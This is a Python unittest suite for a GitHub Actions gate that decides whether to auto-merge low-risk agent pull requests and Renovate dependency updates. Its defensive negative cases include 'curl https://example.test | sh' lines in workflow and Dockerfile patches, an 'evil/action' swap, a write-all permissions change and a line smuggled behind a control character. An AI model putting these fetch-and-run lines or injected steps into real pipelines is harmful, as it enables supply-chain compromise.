"""Table-driven tests for risk_low_automerge.decide."""

import importlib.util
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SPEC = importlib.util.spec_from_file_location(
    "risk_low_automerge", ROOT / ".github/scripts/risk_low_automerge.py"
)
gate = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = gate
SPEC.loader.exec_module(gate)

ACTIONS_ID = 15368
AGENT_BOT_ID = 341351550


def run(name, *, concl="success", status="completed", app_id=ACTIONS_ID, run_id=1, started="2026-01-02"):
    return {
        "name": name,
        "status": status,
        "conclusion": concl,
        "completed_at": started,
        "started_at": started,
        "id": run_id,
        "app": {"id": app_id},
    }


def base_kwargs(**overrides):
    data = dict(
        label_names=frozenset({"risk:low"}),
        draft=False,
        author_login="verbanium-dev-agent[bot]",
        author_type="Bot",
        author_id=AGENT_BOT_ID,
        base_branch="main",
        pr_base="main",
        head_repo_full_name="verbanium-lab/wiki",
        caller_repo="verbanium-lab/wiki",
        changed_files=("src/readme.md",),
        changed_files_ok=True,
        changed_files_detail="",
        check_runs=(run("ci"), run("ai-review")),
        low_risk_label="risk:low",
        high_risk_label="risk:high",
        protected_patterns=(),
        allowed_authors=frozenset(),
        agent_bot_id=AGENT_BOT_ID,
        required_check="ci",
        ai_review_check="ai-review",
        actions_app_id=ACTIONS_ID,
        ai_review_actions_app_id=ACTIONS_ID,
    )
    data.update(overrides)
    return data


class DecideTests(unittest.TestCase):
    def assert_enable(self, **kwargs):
        decision = gate.decide(**base_kwargs(**kwargs))
        self.assertTrue(decision.enable_auto_merge, decision.reasons)

    def assert_skip(self, reason_substr, **kwargs):
        decision = gate.decide(**base_kwargs(**kwargs))
        self.assertFalse(decision.enable_auto_merge)
        self.assertTrue(any(reason_substr in r for r in decision.reasons), decision.reasons)

    def test_happy_path(self):
        self.assert_enable()

    def test_missing_low_risk_label(self):
        self.assert_skip("missing label", label_names=frozenset())

    def test_high_risk_blocks(self):
        self.assert_skip("risk:high", label_names=frozenset({"risk:low", "risk:high"}))

    def test_draft_blocks(self):
        self.assert_skip("draft", draft=True)

    def test_protected_path_blocks(self):
        self.assert_skip("protected", changed_files=(".github/workflows/ci.yml",))

    def test_minimum_protected_package_json_without_caller_patterns(self):
        self.assert_skip("protected", changed_files=("package.json",))

    def test_minimum_protected_dockerfile_glob(self):
        self.assert_skip("protected", changed_files=("apps/api/Dockerfile.prod",))

    def test_author_allowlist_requires_type(self):
        self.assert_enable(
            author_login="human",
            author_type="User",
            author_id=1,
            allowed_authors=frozenset({("human", "User")}),
        )
        self.assert_skip(
            "not allowed",
            author_login="human",
            author_type="Bot",
            author_id=42,
            agent_bot_id=None,
            allowed_authors=frozenset({("human", "User")}),
        )

    def test_agent_bot_id_required_for_bots(self):
        self.assert_skip("not allowed", agent_bot_id=None)
        self.assert_skip("not allowed", author_id=999, agent_bot_id=AGENT_BOT_ID)

    def test_non_agent_author_rejected(self):
        self.assert_skip("not allowed", author_login="human", author_type="User", author_id=1)

    def test_failed_ci(self):
        self.assert_skip("ci", check_runs=(run("ci", concl="failure"), run("ai-review")))

    def test_missing_ai_review(self):
        self.assert_skip("ai-review", check_runs=(run("ci"),))

    def test_empty_ai_review_name_skips_requirement(self):
        self.assert_enable(ai_review_check="", check_runs=(run("ci"),))

    def test_empty_ai_review_name_still_requires_ci(self):
        self.assert_skip("ci", ai_review_check="", check_runs=(run("ci", concl="failure"),))

    def test_empty_ai_review_name_keeps_protected_paths(self):
        self.assert_skip(
            "protected path",
            ai_review_check="",
            check_runs=(run("ci"),),
            changed_files=("package.json",),
        )

    def test_wrong_base_branch(self):
        self.assert_skip("base branch", pr_base="develop")

    def test_fork_head_rejected(self):
        self.assert_skip("head is not", head_repo_full_name="other/repo")

    def test_truncated_file_list_blocks(self):
        self.assert_skip(
            "truncated",
            changed_files_ok=False,
            changed_files_detail="changed-file list truncated (>=3000 files)",
        )

    def test_renamed_file_previous_name_checked(self):
        files = [{"filename": "new/name.md", "previous_filename": ".github/workflows/ci.yml", "status": "renamed"}]
        paths = gate.paths_from_pr_files(files)
        self.assertIn(".github/workflows/ci.yml", paths)
        self.assert_skip("protected", changed_files=paths)

    def test_ai_review_different_app_id(self):
        other_app = 99999
        self.assert_skip(
            "ai-review",
            check_runs=(
                run("ci", app_id=ACTIONS_ID),
                run("ai-review", app_id=other_app),
            ),
            ai_review_actions_app_id=ACTIONS_ID,
        )
        self.assert_enable(
            check_runs=(
                run("ci", app_id=ACTIONS_ID),
                run("ai-review", app_id=other_app),
            ),
            ai_review_actions_app_id=other_app,
        )


class GlobTests(unittest.TestCase):
    def test_root_sops_matches_starstar_slash(self):
        patterns = ("**/.sops.yaml",)
        self.assertEqual(gate.path_matches_protected(".sops.yaml", patterns), "**/.sops.yaml")
        self.assertEqual(gate.path_matches_protected("infra/.sops.yaml", patterns), "**/.sops.yaml")
        self.assertIsNone(gate.path_matches_protected("not-sops.yaml", patterns))

    def test_secrets_glob_root_and_nested(self):
        patterns = ("**/secrets/**",)
        self.assertEqual(gate.path_matches_protected("secrets/a", patterns), "**/secrets/**")
        self.assertEqual(gate.path_matches_protected("pkg/secrets/key", patterns), "**/secrets/**")
        self.assertIsNone(gate.path_matches_protected("src/secretsome/file", patterns))

    def test_case_sensitive(self):
        patterns = ("README.md",)
        self.assertIsNone(gate.path_matches_protected("readme.md", patterns))

    def test_dotdot_rejected_as_protected(self):
        self.assertEqual(gate.path_matches_protected("../x", (".github/**",)), "..")

    def test_fnmatch_starstar_slash_empty_prefix_old_bug(self):
        """Regression: Python fnmatch does not treat **/ as matching zero segments."""
        patterns = ("**/.sops.yaml", "**/secrets/**")
        self.assertIsNotNone(gate.path_matches_protected(".sops.yaml", patterns))
        self.assertIsNotNone(gate.path_matches_protected("secrets/x", patterns))

    def test_dockerfile_suffix_glob(self):
        patterns = ("Dockerfile*", "**/Dockerfile*")
        self.assertEqual(gate.path_matches_protected("Dockerfile", patterns), "Dockerfile*")
        self.assertEqual(gate.path_matches_protected("Dockerfile.prod", patterns), "Dockerfile*")
        self.assertEqual(
            gate.path_matches_protected("apps/api/Dockerfile.prod", patterns), "**/Dockerfile*"
        )


class CheckRunLatestTests(unittest.TestCase):
    def test_rerun_in_progress_blocks(self):
        runs = (
            run("ci", run_id=1, started="2026-01-01", status="completed", concl="success"),
            run("ci", run_id=2, started="2026-01-02", status="in_progress", concl=None),
        )
        ok, detail = gate.latest_check_success(runs, check_name="ci", actions_app_id=ACTIONS_ID)
        self.assertFalse(ok)
        self.assertIn("in_progress", detail)

    def test_old_success_new_failure_blocks(self):
        runs = (
            run("ci", run_id=1, started="2026-01-01", concl="success"),
            run("ci", run_id=2, started="2026-01-02", concl="failure"),
        )
        ok, _ = gate.latest_check_success(runs, check_name="ci", actions_app_id=ACTIONS_ID)
        self.assertFalse(ok)


class HelperTests(unittest.TestCase):
    def test_parse_patterns_and_protected(self):
        patterns = gate.parse_patterns(".github/workflows/**\nREADME.md")
        self.assertEqual(patterns, (".github/workflows/**", "README.md"))
        self.assertEqual(
            gate.path_matches_protected(".github/workflows/ci.yml", patterns),
            ".github/workflows/**",
        )
        self.assertEqual(gate.path_matches_protected("README.md", patterns), "README.md")

    def test_pr_files_inventory(self):
        ok, _ = gate.pr_files_inventory_ok(file_count=2, listed_count=2)
        self.assertTrue(ok)
        ok, msg = gate.pr_files_inventory_ok(file_count=None, listed_count=1)
        self.assertFalse(ok)
        self.assertIn("unknown", msg)
        ok, msg = gate.pr_files_inventory_ok(file_count=3000, listed_count=3000)
        self.assertFalse(ok)
        self.assertIn("truncated", msg)

    def test_github_actions_output_multiline(self):
        block = gate.github_actions_output_value("paths", "a\nb")
        self.assertIn("paths<<", block)
        self.assertIn("a\nb", block)

    def test_github_actions_output_rejects_percent_newline(self):
        with self.assertRaises(ValueError):
            gate.github_actions_output_value("x", "a%0Ab")

    def test_effective_protected_includes_minimum(self):
        merged = gate.effective_protected_patterns(("extra/path/**",))
        self.assertIn(".github/**", merged)
        self.assertIn("package.json", merged)
        self.assertIn("extra/path/**", merged)

    def test_neutralize_strips_injection(self):
        dirty = "path\nfoo::notice::\rbar"
        clean = gate.neutralize_actions_log_text(dirty)
        self.assertNotIn("\n", clean)
        self.assertNotIn("::", clean)


RENOVATE_BOT_ID = 348239511

WORKFLOW_PATCH = (
    "@@ -10,7 +10,7 @@ jobs:\n"
    "       - name: Check out\n"
    "-        uses: actions/checkout@aaaaaaaa # v4.2.0\n"
    "+        uses: actions/checkout@bbbbbbbb # v4.3.1\n"
    "       - name: Build\n"
)
DOCKERFILE_PATCH = (
    "@@ -1,3 +1,3 @@\n"
    "-FROM node:26-slim@sha256:aaaa AS build\n"
    "+FROM node:26-slim@sha256:bbbb AS build\n"
    " RUN pnpm install\n"
    "-COPY --from=ghcr.io/org/tool:1.2@sha256:aaaa /bin/tool /bin/tool\n"
    "+COPY --from=ghcr.io/org/tool:1.2@sha256:bbbb /bin/tool /bin/tool\n"
)


def entry(filename, patch=None, status="modified", **extra):
    data = {"filename": filename, "status": status}
    if patch is not None:
        data["patch"] = patch
    data.update(extra)
    return data


def dependency_kwargs(**overrides):
    data = dict(
        label_names=frozenset({"deps:automerge"}),
        draft=False,
        author_login="verbanium-lab-renovate[bot]",
        author_type="Bot",
        author_id=RENOVATE_BOT_ID,
        base_branch="main",
        pr_base="main",
        head_repo_full_name="verbanium-lab/wiki",
        caller_repo="verbanium-lab/wiki",
        files=(entry("package.json", "@@ -1 +1 @@\n-a\n+b\n"), entry("pnpm-lock.yaml")),
        changed_files_ok=True,
        changed_files_detail="",
        check_runs=(run("ci"),),
        dependency_label="deps:automerge",
        high_risk_label="risk:high",
        dependency_bot_id=RENOVATE_BOT_ID,
        required_check="ci",
        actions_app_id=ACTIONS_ID,
    )
    data.update(overrides)
    return data


class DependencyModeTests(unittest.TestCase):
    def assert_enable(self, **kwargs):
        decision = gate.decide_dependencies(**dependency_kwargs(**kwargs))
        self.assertTrue(decision.enable_auto_merge, decision.reasons)

    def assert_skip(self, reason_substr, **kwargs):
        decision = gate.decide_dependencies(**dependency_kwargs(**kwargs))
        self.assertFalse(decision.enable_auto_merge)
        self.assertTrue(any(reason_substr in r for r in decision.reasons), decision.reasons)

    def test_happy_path(self):
        self.assert_enable()

    def test_allow_list_files_pass(self):
        self.assert_enable(
            files=(
                entry("package.json"),
                entry("apps/web/package.json"),
                entry("pnpm-lock.yaml"),
                entry("pnpm-workspace.yaml"),
                entry(".github/workflows/ci.yml", WORKFLOW_PATCH),
                entry("Dockerfile", DOCKERFILE_PATCH),
                entry("apps/api/Dockerfile.prod", DOCKERFILE_PATCH),
            )
        )

    def test_protected_list_is_not_applied(self):
        # package.json, lock file, Dockerfile and workflow all match the risk-low protected list.
        decision = gate.decide_dependencies(**dependency_kwargs())
        self.assertFalse(any("protected" in r for r in decision.reasons))
        for name in ("package.json", "pnpm-lock.yaml"):
            self.assertIsNotNone(gate.path_matches_protected(name, gate.MINIMUM_PROTECTED_PATTERNS))

    def test_lock_file_without_patch_passes(self):
        self.assert_enable(files=(entry("pnpm-lock.yaml"),))

    # author
    def test_wrong_author_id(self):
        self.assert_skip("not the dependency bot", author_id=1234)

    def test_human_author(self):
        self.assert_skip(
            "not the dependency bot", author_login="human", author_type="User", author_id=RENOVATE_BOT_ID
        )

    def test_agent_bot_is_not_the_dependency_bot(self):
        self.assert_skip("not the dependency bot", author_id=AGENT_BOT_ID)

    def test_empty_bot_id_denies_everything(self):
        self.assert_skip("no dependency bot id", dependency_bot_id=None)

    # labels
    def test_label_missing(self):
        self.assert_skip("missing label deps:automerge", label_names=frozenset())

    def test_risk_low_label_is_not_the_dependency_label(self):
        self.assert_skip("missing label", label_names=frozenset({"risk:low"}))

    def test_empty_dependency_label_denies(self):
        self.assert_skip("missing label", dependency_label="", label_names=frozenset({""}))

    def test_custom_label(self):
        self.assert_enable(dependency_label="deps:ok", label_names=frozenset({"deps:ok"}))

    def test_high_risk_label_blocks(self):
        self.assert_skip("risk:high", label_names=frozenset({"deps:automerge", "risk:high"}))

    # files
    def test_extra_source_file_refuses(self):
        self.assert_skip(
            "src/x.ts",
            files=(entry("package.json"), entry("src/x.ts", "@@ -1 +1 @@\n-a\n+b\n")),
        )

    def test_other_config_files_refuse(self):
        for name in (".npmrc", "justfile", "docker-compose.yml", ".github/CODEOWNERS", "renovate.json"):
            with self.subTest(name=name):
                self.assert_skip("allow-list", files=(entry(name, "@@ -1 +1 @@\n-a\n+b\n"),))

    def test_nested_workflow_path_refuses(self):
        self.assert_skip("allow-list", files=(entry(".github/workflows/sub/ci.yml", WORKFLOW_PATCH),))

    def test_workflow_yaml_extension_refuses(self):
        self.assert_skip("allow-list", files=(entry(".github/workflows/ci.yaml", WORKFLOW_PATCH),))

    def test_dotdot_path_refuses(self):
        self.assert_skip("..", files=(entry("../package.json"),))

    def test_added_file_refuses(self):
        self.assert_skip("status 'added'", files=(entry("package.json", status="added"),))

    def test_removed_file_refuses(self):
        self.assert_skip("status 'removed'", files=(entry("package.json", status="removed"),))

    def test_renamed_file_refuses(self):
        self.assert_skip(
            "status 'renamed'",
            files=(entry("package.json", status="renamed", previous_filename="old/package.json"),),
        )

    def test_previous_filename_refuses_even_when_modified(self):
        self.assert_skip("renamed", files=(entry("package.json", previous_filename="old.json"),))

    def test_no_files_refuses(self):
        self.assert_skip("no changed files", files=())

    def test_truncated_file_list_refuses(self):
        self.assert_skip(
            "truncated",
            changed_files_ok=False,
            changed_files_detail="changed-file list truncated (>=3000 files)",
        )

    def test_file_count_mismatch_refuses(self):
        self.assert_skip(
            "does not match",
            changed_files_ok=False,
            changed_files_detail="changed-file count does not match listed files",
        )

    # workflow files: uses: lines only
    def test_workflow_uses_change_passes(self):
        self.assert_enable(files=(entry(".github/workflows/ci.yml", WORKFLOW_PATCH),))

    def test_workflow_without_patch_refuses(self):
        self.assert_skip("no patch", files=(entry(".github/workflows/ci.yml"),))

    def test_workflow_empty_patch_refuses(self):
        self.assert_skip("no patch", files=(entry(".github/workflows/ci.yml", ""),))

    def test_workflow_non_uses_line_refuses(self):
        patch = WORKFLOW_PATCH + "+        run: curl https://example.test | sh\n"
        self.assert_skip("not a uses: line", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_changed_run_line_refuses(self):
        patch = "@@ -1 +1 @@\n-        run: echo a\n+        run: echo b\n"
        self.assert_skip("not a uses: line", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_permissions_change_refuses(self):
        patch = WORKFLOW_PATCH + "-permissions: {}\n+permissions: write-all\n"
        self.assert_skip("not a uses: line", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_added_step_refuses(self):
        patch = "@@ -1 +1,2 @@\n         uses: actions/checkout@bbbbbbbb # v4\n+        uses: evil/action@v1\n"
        self.assert_skip("do not pair up", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_action_swap_refuses(self):
        patch = "@@ -1 +1 @@\n-        uses: actions/checkout@aaaa\n+        uses: evil/checkout@aaaa\n"
        self.assert_skip("do not pair up", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_hidden_line_after_odd_separator_refuses(self):
        patch = "@@ -1 +1 @@\n-        uses: a/b@1\n+        uses: a/b@2\x0b+        run: evil\n"
        self.assert_skip("control characters", files=(entry(".github/workflows/ci.yml", patch),))

    def test_workflow_context_lines_are_ignored(self):
        patch = "@@ -1,3 +1,3 @@\n run: untouched\n-  uses: a/b@1\n+  uses: a/b@2\n permissions: {}\n"
        self.assert_enable(files=(entry(".github/workflows/ci.yml", patch),))

    # Dockerfiles: FROM and COPY --from= only
    def test_dockerfile_digest_change_passes(self):
        self.assert_enable(files=(entry("Dockerfile", DOCKERFILE_PATCH),))

    def test_dockerfile_without_patch_refuses(self):
        self.assert_skip("no patch", files=(entry("Dockerfile"),))

    def test_dockerfile_run_change_refuses(self):
        patch = "@@ -1,2 +1,2 @@\n-RUN pnpm install\n+RUN curl https://example.test | sh\n"
        self.assert_skip("not a FROM or COPY", files=(entry("Dockerfile", patch),))

    def test_dockerfile_run_next_to_from_refuses(self):
        patch = DOCKERFILE_PATCH + "+RUN curl https://example.test | sh\n"
        self.assert_skip("not a FROM or COPY", files=(entry("Dockerfile", patch),))

    def test_dockerfile_plain_copy_refuses(self):
        patch = "@@ -1 +1 @@\n-COPY . /app\n+COPY . /srv\n"
        self.assert_skip("not a FROM or COPY", files=(entry("Dockerfile", patch),))

    def test_dockerfile_copy_source_change_refuses(self):
        patch = (
            "@@ -1 +1 @@\n-COPY --from=img:1@sha256:aa /bin/a /bin/a\n"
            "+COPY --from=img:1@sha256:bb /bin/evil /bin/a\n"
        )
        self.assert_skip("do not pair up", files=(entry("Dockerfile", patch),))

    def test_dockerfile_tag_change_refuses(self):
        patch = "@@ -1 +1 @@\n-FROM node:26-slim@sha256:aa\n+FROM node:27-slim@sha256:bb\n"
        self.assert_skip("do not pair up", files=(entry("Dockerfile", patch),))

    def test_dockerfile_new_stage_refuses(self):
        patch = "@@ -1 +1,2 @@\n FROM node:26@sha256:aa\n+FROM evil:1@sha256:bb\n"
        self.assert_skip("do not pair up", files=(entry("Dockerfile", patch),))

    def test_dockerfile_pin_adds_digest(self):
        patch = "@@ -1 +1 @@\n-FROM node:26-slim\n+FROM node:26-slim@sha256:bb\n"
        self.assert_enable(files=(entry("Dockerfile", patch),))

    def test_dockerfile_lowercase_from_with_platform_flag(self):
        patch = "@@ -1 +1 @@\n-from --platform=linux/amd64 node:26@sha256:aa\n+from --platform=linux/amd64 node:26@sha256:bb\n"
        self.assert_enable(files=(entry("Dockerfile", patch),))

    # checks
    def test_red_check_refuses(self):
        self.assert_skip("ci", check_runs=(run("ci", concl="failure"),))

    def test_pending_check_refuses(self):
        self.assert_skip("in_progress", check_runs=(run("ci", status="in_progress", concl=None),))

    def test_missing_check_refuses(self):
        self.assert_skip("missing", check_runs=())

    def test_check_from_other_app_refuses(self):
        self.assert_skip("missing", check_runs=(run("ci", app_id=99999),))

    def test_ai_review_is_not_required(self):
        self.assert_enable(check_runs=(run("ci"),))

    # pull request shape
    def test_draft_refuses(self):
        self.assert_skip("draft", draft=True)

    def test_wrong_base_refuses(self):
        self.assert_skip("base branch", pr_base="develop")

    def test_fork_head_refuses(self):
        self.assert_skip("head is not", head_repo_full_name="other/repo")


class DependencyPayloadTests(unittest.TestCase):
    def payload(self, **overrides):
        data = dict(
            mode="dependencies",
            label_names=["deps:automerge"],
            author_login="verbanium-lab-renovate[bot]",
            author_type="Bot",
            author_id=RENOVATE_BOT_ID,
            base_branch="main",
            pr_base="main",
            head_repo="verbanium-lab/wiki",
            caller_repo="verbanium-lab/wiki",
            files=[entry("package.json")],
            check_runs=[run("ci")],
            dependency_label="deps:automerge",
            high_risk_label="risk:high",
            dependency_bot_id=str(RENOVATE_BOT_ID),
            required_check="ci",
            actions_app_id=ACTIONS_ID,
        )
        data.update(overrides)
        return data

    def test_dependencies_payload_enables(self):
        self.assertTrue(gate.decide_from_payload(self.payload()).enable_auto_merge)

    def test_empty_dependency_bot_id_denies(self):
        decision = gate.decide_from_payload(self.payload(dependency_bot_id=""))
        self.assertFalse(decision.enable_auto_merge)

    def test_unknown_mode_is_an_error(self):
        with self.assertRaises(ValueError):
            gate.decide_from_payload(self.payload(mode="anything"))

    def test_default_mode_is_risk_low(self):
        payload = dict(
            label_names=["risk:low"],
            author_login="verbanium-dev-agent[bot]",
            author_type="Bot",
            author_id=AGENT_BOT_ID,
            base_branch="main",
            pr_base="main",
            head_repo="verbanium-lab/wiki",
            caller_repo="verbanium-lab/wiki",
            changed_files=["src/readme.md"],
            check_runs=[run("ci"), run("ai-review")],
            low_risk_label="risk:low",
            high_risk_label="risk:high",
            agent_bot_id=str(AGENT_BOT_ID),
            required_check="ci",
            ai_review_check="ai-review",
            actions_app_id=ACTIONS_ID,
        )
        self.assertTrue(gate.decide_from_payload(payload).enable_auto_merge)
        # The Renovate bot and its label do nothing in the default mode.
        payload.update(label_names=["deps:automerge"], author_id=RENOVATE_BOT_ID)
        self.assertFalse(gate.decide_from_payload(payload).enable_auto_merge)
        # The protected list still applies in the default mode.
        payload.update(label_names=["risk:low"], author_id=AGENT_BOT_ID, changed_files=["package.json"])
        self.assertFalse(gate.decide_from_payload(payload).enable_auto_merge)


class PatchHelperTests(unittest.TestCase):
    def test_changed_lines_skip_headers_context_and_no_newline_marker(self):
        patch = "@@ -1,3 +1,3 @@\n ctx\n-old\n+new\n\\ No newline at end of file\n"
        self.assertEqual(gate.patch_changed_lines(patch), [("-", "old"), ("+", "new")])

    def test_plus_plus_plus_line_is_a_change(self):
        self.assertEqual(gate.patch_changed_lines("@@ -1 +1 @@\n+++ x\n"), [("+", "++ x")])

    def test_crlf_is_tolerated(self):
        patch = "@@ -1 +1 @@\r\n-FROM a@sha256:1\r\n+FROM a@sha256:2\r\n"
        self.assertIsNone(gate.dependency_patch_problem("dockerfile", patch))

    def test_control_character_is_unreadable(self):
        self.assertIsNone(gate.patch_changed_lines("@@ -1 +1 @@\n+a\x00b\n"))


if __name__ == "__main__":
    unittest.main()
